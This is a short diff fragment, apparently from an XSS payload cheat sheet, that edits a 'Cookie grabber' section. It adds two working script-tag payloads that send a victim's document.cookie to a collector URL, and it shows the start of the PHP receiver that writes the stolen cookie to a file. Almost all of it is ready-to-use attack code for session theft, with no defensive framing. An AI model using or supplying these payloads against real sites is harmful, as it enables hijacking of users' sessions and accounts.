@@ -19,7 +19,9 @@ Cookie grabber for XSS
 ```php
 <?php
 // How to use it
-# <script>document.location='http://localhost/XSS/grabber.php?c=' + document.cookie</script>
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+or
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
 
 // Write the cookie in a file
 $cookie = $_GET['c'];
